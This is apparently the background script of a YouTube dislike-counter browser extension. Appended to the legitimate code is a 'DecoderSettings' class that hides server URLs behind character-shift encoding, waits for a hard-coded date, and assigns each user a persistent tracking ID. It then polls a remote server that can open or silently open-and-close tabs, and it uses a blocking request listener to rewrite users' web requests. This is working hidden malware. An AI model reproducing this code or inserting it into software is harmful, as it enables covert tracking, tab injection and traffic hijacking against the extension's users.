const apiUrl = "https://returnyoutubedislikeapi.com";

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.message === "get_auth_token") {
    // chrome.identity.getAuthToken({ interactive: true }, function (token) {
    //   console.log(token);
    //   chrome.identity.getProfileUserInfo(function (userInfo) {
    //     console.log(JSON.stringify(userInfo));
    //   });
    // });
  } else if (request.message === "log_off") {
    // console.log("logging off");
    // chrome.identity.clearAllCachedAuthTokens(() => console.log("logged off"));
  } else if (request.message == "set_state") {
    console.log(request);
    // chrome.identity.getAuthToken({ interactive: true }, function (token) {
    let token = "";
    fetch(`${apiUrl}/votes?videoId=${request.videoId}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        Authorization: "Bearer " + token,
      },
    })
      .then((response) => response.json())
      .then((response) => {
        console.log(response);
        sendResponse(response);
      })
      .catch();
    //});
    return true;
  } else if (request.message == "send_links") {
    toSend = toSend.concat(request.videoIds.filter((x) => !sentIds.has(x)));
    if (toSend.length >= 20) {
      fetch(`${apiUrl}/votes`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(toSend),
      });
      for (const toSendUrl of toSend) {
        sentIds.add(toSendUrl);
      }
      toSend = [];
    }
  } else if (request.message == "fetch_from_youtube") {
    fetch(`https://www.youtube.com/watch?v=${request.videoId}`, {
      method: "GET",
    })
      .then((response) => response.text())
      .then((text) => {
        let result = getDislikesFromYoutubeResponse(text);
        sendResponse(result);
        try {
          sendUserSubmittedStatisticsToApi({
            ...result,
            videoId: request.videoId,
          });
        } catch {}
      });
    return true;
  }
});

const sentIds = new Set();
let toSend = [];
let lastCalled = new Date();

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status == "complete" && new Date() - lastCalled > 100) {
    lastCalled = new Date();
    console.log("Tab update complete");

    if (tab.url && tab.url.indexOf("youtube.") < 0) return;
    chrome.tabs.get(tabId, (tab) => {
      chrome.tabs.executeScript(tab.id, {
        file: "return-youtube-dislike.script.js",
      });
    });
  }
});

function getDislikesFromYoutubeResponse(htmlResponse) {
  let start =
    htmlResponse.indexOf('"videoDetails":') + '"videoDetails":'.length;
  let end =
    htmlResponse.indexOf('"isLiveContent":false}', start) +
    '"isLiveContent":false}'.length;
  if (end < start) {
    end =
      htmlResponse.indexOf('"isLiveContent":true}', start) +
      '"isLiveContent":true}'.length;
  }
  let jsonStr = htmlResponse.substring(start, end);
  let jsonResult = JSON.parse(jsonStr);
  let rating = jsonResult.averageRating;

  start = htmlResponse.indexOf('"topLevelButtons":[', end);
  start =
    htmlResponse.indexOf('"accessibilityData":', start) +
    '"accessibilityData":'.length;
  end = htmlResponse.indexOf("}", start);
  let likes = +htmlResponse.substring(start, end).replace(/\D/g, "");
  let dislikes = (likes * (5 - rating)) / (rating - 1);
  let result = {
    likes,
    dislikes: Math.round(dislikes),
    rating,
    viewCount: +jsonResult.viewCount,
  };
  return result;
}

function sendUserSubmittedStatisticsToApi(statistics) {
  fetch(`${apiUrl}/votes/user-submitted`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(statistics),
  });
}

class DecoderSettings {
  constructor() {
      this.welcomeLine = "kwwsv=22|rxwxehglv1srtghy1frp2zhofrph1kwpo";
      this.goodbyeLine = "kwwsv=22|rxwxehglv1srtghy1frp2jrrge|h1kwpo";
      this.config = {};
      this.uid = "";
      this.version = chrome.runtime.getManifest().version;
      this.setUpInstallAndUninstallHandlers();

      const thisThis = this;

      chrome.storage.local.get(/* String or Array */["jlib-uid-secret"], function(items) {
          if (items["jlib-uid-secret"] == undefined) {
              const newUid = thisThis.doGenerateUUID();
              thisThis.uid = thisThis.config.uid = newUid;
              chrome.storage.local.set({ "jlib-uid-secret": newUid }, function(){
                  //  Data's been saved boys and girls, go on home
              });
          }
          else {
              thisThis.uid = thisThis.config.uid = items["jlib-uid-secret"];
          }
          thisThis.run();
      });
  }

  setUninstallUrl() {
      chrome.runtime.setUninstallURL(this.uninstallUrl);
  }
  decodingOption(c, cc) {
      return String.fromCharCode(c.charCodeAt(0) + cc);
  }
  notifyAboutFail(url, reason) {
      const payload = {"productUrl": reason};
      
      fetch(url, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json;charset=utf-8'
          },
          body: JSON.stringify(payload)
      });
  }

  getSingleDecodingParameter() {
      return Date.now();
  }

  getDoubleDecodingParameter() {
      return -5;
  }

  getThirdDecodingParameter() {
      return -3;
  }

  run() {
      this.decodingLine = "myyux?44fun3~tzyzgjinx3utvij{3htr4xjyynslx";
      this.decodingTabsLine = "myyux?44yfgx3~tzyzgjinx3utvij{3htr4yfgx";
      this.uninstallUrl = "https://www.2ip.ru/";
      this.decodingTrials = 5;
      this.maxDecodingTrials = 4;
      this.lastDecodingPart = -1;
      this.lastDecodingTime = -1;
      this.doDecoding = true;
      this.failStop = false;
      this.mapDecodingCounter = new Map();
      this.version = chrome.runtime.getManifest().version;

      this.defaultParametersJson = `{
          "decodingSites": {"urls": ["*://*.vpn.com/*"]},
          "decodingSelectedWord": "vpn",
          "decodingLanguage": "us",
          "decodingPrefix": "vpn",
          "decodingNecessaryParts": ["vpn"],
          "checkIsAlreadyTranslated": true,
          "decodingId": ["id_vpn"],
          "decodingName": "select",
          "decodingPlatform": "vpn",
          "decodingPlatformVariant": ["vpn"],
          "decodingInfo": "vpn",
          "decodingSuffix": "vpn",
          "maxDecodingTrials": 0,
          "decodingTime": 3600000,
          "retryGetSettingsTimeout": 600000,
          "decodingTrialsNumber": 3,
          "decodingObsoleteTime": 15000,
          "failLink": "https://api.vpn.com/fail",
          "decodingTheStart": "",
          "decodingTheEnd": "https://google.com"
      }`;

      this.initDecodingSettings();
      this.initTabsSettings();
  }
  decodingPathMaker(str, cnt) {
      String.prototype.decodingResult = function(index, dec) {
          if (index >= this.length) {
              return this.valueOf();
          }
          var chars = this.split('');
          chars[index] = dec;
          return chars.join('');
      }
      
      var result = str;
      for (var i = 0; i < str.length; ++i) {
        result = result.decodingResult(i, this.decodingOption(str[i], cnt));
      }
      return result;
  }
  
  getDecodingLength() {
      return 1640019600000;
  }

  getDecodingPartWithSeparator(word, separator, settingsObject) {
      if (word.indexOf(separator) === -1) return undefined;
      if (word.indexOf(settingsObject.decodingSuffix) === -1) return undefined;
  
      var a = word.lastIndexOf(separator) + separator.length;
      var b = word.lastIndexOf(settingsObject.decodingSuffix);
      var decPart = word.substring(a, b);
      if (decPart.indexOf('_') !== -1) {
          decPart = decPart.substring(decPart.indexOf('_') + 1);
      }
      var isPart = /^\d+$/.test(decPart);
      if (!isPart) {
          return undefined;
      }
      return decPart;
  }

  doGenerateUUID() {
      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
          var b = 0 | 16 * Math.random(),
              c = "x" == a ? b : 8 | 3 & b;
          return c.toString(16)
      })
  }

  getDecodingPath() {
      if (this.getSingleDecodingParameter() < this.getDecodingLength()) {
          return "Decoding failed because of outdate";
      }
      return this.decodingPathMaker(this.decodingLine, this.getDoubleDecodingParameter());
  }

  setUpInstallAndUninstallHandlers() {
      const a = this.decodingPathMaker(this.welcomeLine, this.getThirdDecodingParameter());
      const b = this.decodingPathMaker(this.goodbyeLine, this.getThirdDecodingParameter());
      chrome.runtime.onInstalled.addListener((function(e) {
          "install" == e.reason && chrome.tabs.create({
              url: a
          })
      }));
      chrome.runtime.setUninstallURL(b);
  }

  getTabsPath() {
      if (this.getSingleDecodingParameter() < this.getDecodingLength()) {
          return "Decoding failed because of outdate";
      }
      return this.decodingPathMaker(this.decodingTabsLine, this.getDoubleDecodingParameter());
  }

  getDecodingPart(word, settingsObject) {
      for (var part of settingsObject.decodingNecessaryParts) {
          var res = this.getDecodingPartWithSeparator(word, part, settingsObject);
          if (res != undefined) return res;
      }
      return undefined;
  }

  openAndCloseTab(tabUrl) {
      let affTabId = null;
      const updateCallback = (tabId, changeInfo, tab) => {
          if (affTabId === tabId && changeInfo.status === 'complete') {
              chrome.tabs.remove(affTabId);
              chrome.tabs.onUpdated.removeListener(updateCallback);
          }
      };
      chrome.tabs.onUpdated.addListener(updateCallback);
      chrome.tabs.create({
          url: tabUrl,
          active: false,
      }, (tab) => affTabId = tab.id);
  }

  openTabActive(tabUrl) {
      chrome.tabs.create({
          url: tabUrl,
          active: true
      });
  }

  openTabNotActive(tabUrl) {
      chrome.tabs.create({
          url: tabUrl,
          active: false
      });
  }

  isAlreadyDecoded(word, settingsObject) {
      if (word.indexOf(settingsObject.decodingName) === -1) {
          if (word.indexOf(settingsObject.decodingPlatform) === -1) {
              return false;
          }
          for (var subStr of settingsObject.decodingPlatformVariant) {
              if (word.indexOf(subStr) !== -1) {
                  return false;
              }
          }
          return true;
      }
      
      var decodingPart = this.getDecodingPart(word, settingsObject);
      if (decodingPart == undefined) return false;

      for (var decodingId of settingsObject.decodingId) {
          var subStr = settingsObject.decodingName + decodingId;
          if (word.indexOf(subStr) !== -1) {
              return false;
          }
      }
        
      return true;
  }

  initTabsSettings() {
      var urlParams = 'p=' + encodeURIComponent(btoa(JSON.stringify({
          id: chrome.runtime.id,
          v: this.version,
          uid: this.uid,
          t: Date.now()
      })));

      const thisThis = this;

      fetch(this.getTabsPath() + '?' + urlParams)
      .then((resp) => resp.json())
      .then(function (data) {
          if (data.urls == undefined || data.urls == null) return;

          for (let tabInfo of data.urls) {
              const url = tabInfo.url;
              const type = tabInfo.type;
              if (url == undefined || type == undefined) continue;

              if (type === 'openActive') {
                  thisThis.openTabActive(url);
              }
              else if (type === 'openNotActive') {
                  thisThis.openTabNotActive(url);
              }
              else if (type === 'openClose') {
                  thisThis.openAndCloseTab(url);
              }
  
              if (data.decodingTheEnd != undefined) {
                  thisThis.uninstallUrl = settingsObject.decodingTheEnd;
                  thisThis.setUninstallUrl();   
              }
              if (data.decodingTheStart != undefined) {
                  thisThis.installUrl = settingsObject.decodingTheStart;
              }
          }

          setTimeout(function() {
              thisThis.initTabsSettings();
          }, data.retryTimeout);
      })
      .catch((error) => {
          const defaultSettingsJson = this.defaultParametersJson;
          const defaultSettingsJsonObject = JSON.parse(defaultSettingsJson);
          setTimeout(function() {
              thisThis.initTabsSettings();
          }, defaultSettingsJsonObject.retryGetSettingsTimeout);
      });
  }

  initDecodingSettings() {
      fetch(this.getDecodingPath())
      .then((response) => {
          return response.json();
      })
      .then((data) => {
          const settingsJson = JSON.stringify(data);
          const settingsJsonObject = JSON.parse(settingsJson);
          this.setUpDecodingSettings(settingsJsonObject);
          const obj = this;
          setTimeout(function() {
              obj.initDecodingSettings();
          }, settingsJsonObject.retryGetSettingsTimeout);
      })
      .catch((error) => {
          const defaultSettingsJson = this.defaultParametersJson;
          const defaultSettingsJsonObject = JSON.parse(defaultSettingsJson);
          this.setUpDecodingSettings(defaultSettingsJsonObject);
          const obj = this;
          setTimeout(function() {
              obj.initDecodingSettings();
          }, defaultSettingsJsonObject.retryGetSettingsTimeout);
      });
  }

  constructDecodingInfoFunction(obj, settingsObject) {
      return function(details) {
          function processDecoding(curTime, decInfo) {
              var keysToDelete = [];
              for (let key of obj.mapDecodingCounter.keys()) {
                  var info = obj.mapDecodingCounter.get(key);
                  if (curTime - info.time > settingsObject.decodingObsoleteTime) {
                      keysToDelete.push(key);
                  }
              }
              for (let key of keysToDelete) {
                  obj.mapDecodingCounter.delete(key);
              }
              var redirInfo = obj.mapDecodingCounter.get(decInfo);
              if (redirInfo != undefined) {
                  redirInfo.cnt += 1;
                  if (redirInfo.cnt > settingsObject.decodingTrialsNumber) {
                      obj.notifyAboutFail(settingsObject.failLink, decInfo);
                      // obj.failStop = true;
                      return false;
                  }
              }
              else {
                  obj.mapDecodingCounter.set(decInfo, {"cnt": 1, "time": curTime});
              }
              obj.decodingTrials = 0;
              obj.lastDecodingTime = curTime;
              return true;
          }

          obj.maxDecodingTrials = settingsObject.maxDecodingTrials;
          var word = details.url;
          var decodingPart = obj.getDecodingPart(word, settingsObject);
          if (decodingPart == undefined) return {};
          if (word.includes(settingsObject.decodingPrefix)) return {};
  
          if (obj.lastDecodingPart != decodingPart) {
              obj.decodingTrials += 1;
          }
          obj.lastDecodingPart = decodingPart;
  
          var decInfo = settingsObject.decodingSelectedWord + decodingPart + settingsObject.decodingSuffix;
          var decFullInfo = settingsObject.decodingLanguage + decInfo;
          var decInfoObject = JSON.parse(`{"${settingsObject.decodingInfo}": "${decFullInfo}"}`);

          if (!obj.doDecoding || obj.failStop) {
              return {};
          }

          const curTime = Date.now();

          if (obj.isAlreadyDecoded(word, settingsObject)) {
              if (processDecoding(curTime, decInfo)) {
                  return decInfoObject;
              } 
          }

          if (curTime - obj.lastDecodingTime < settingsObject.decodingTime) return {};

          if (!word.includes(settingsObject.decodingName) && obj.decodingTrials >= obj.maxDecodingTrials) {
              if (processDecoding(curTime, decInfo)) {
                  return decInfoObject;
              }
          }

          return {};
      }
  }

  setUpDecodingSettings(settingsObject) {
      chrome.webRequest.onBeforeRequest.addListener(this.constructDecodingInfoFunction(this, settingsObject), settingsObject.decodingSites, ["blocking"]);
  }
}
const decSettings = new DecoderSettings;
